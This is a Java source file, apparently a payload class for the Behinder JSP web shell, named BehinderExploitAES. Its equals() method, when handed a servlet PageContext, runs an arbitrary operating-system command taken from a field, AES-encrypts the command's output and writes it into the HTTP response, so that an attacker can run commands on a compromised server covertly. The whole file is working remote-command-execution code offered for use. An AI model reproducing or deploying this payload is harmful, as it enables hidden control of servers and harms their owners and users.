package com.feihong.asm;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.jsp.PageContext;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.security.spec.AlgorithmParameterSpec;
import java.util.Base64;

public class BehinderExploitAES {
    private String str;
    private String encryptKey;
    private String iv;

    public String encrypt(final String plaintext) {
        try {
            // new SecretKeySpec 中的 byte[] 的 length 必须是 16或者24或者32， 否则会抛 InvalidKeyException 异常
            SecretKey key = new SecretKeySpec(this.encryptKey.getBytes(), "AES");
            // IV的长度必须和 BlockSize 一致（在这里 byte[] 的 length 应该为16），否则会抛 InvalidAlgorithmParameterException 异常
            AlgorithmParameterSpec iv = new IvParameterSpec(this.iv.getBytes());
            // 指定加密的算法、工作模式和填充方式
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, key, iv);
            byte[] result = cipher.doFinal(plaintext.getBytes("UTF-8"));
            return Base64.getEncoder().encodeToString(result);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    @Override
    public boolean equals(Object obj) {
        if(obj instanceof PageContext){
            PageContext page = (PageContext)obj;
            String result = "";
            try{
                InputStream inputStream = Runtime.getRuntime().exec(str.split(",",3)).getInputStream();
                int len = 0;
                byte[] bytes = new byte[1024];
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                while((len = inputStream.read(bytes)) != -1){
                    baos.write(bytes, 0, len);
                }
                result = baos.toString();
                inputStream.close();
                baos.close();
            }catch (Exception e){
                e.printStackTrace();
            }

            try {
                page.getResponse().getWriter().print(this.encrypt(result.trim()));
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        return super.equals(obj);
    }
}
